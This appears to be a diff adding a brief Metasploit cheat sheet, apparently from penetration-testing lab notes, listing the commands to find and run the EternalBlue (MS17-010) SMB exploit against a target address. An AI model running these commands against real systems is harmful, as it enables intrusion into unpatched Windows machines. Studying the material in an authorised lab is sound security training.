@@ -1,0 +1,5 @@
+search exploit eternalblue                 - find public exploit in MSF
+use exploit/windows/smb/ms17_010_psexec    - start using an MSF module
+show options                               - Show required options for an MSF module
+set RHOSTS 10.10.10.40                     - Set a value for an MSF module option
+run                                        - Run the exploit on the target server is vulnerable
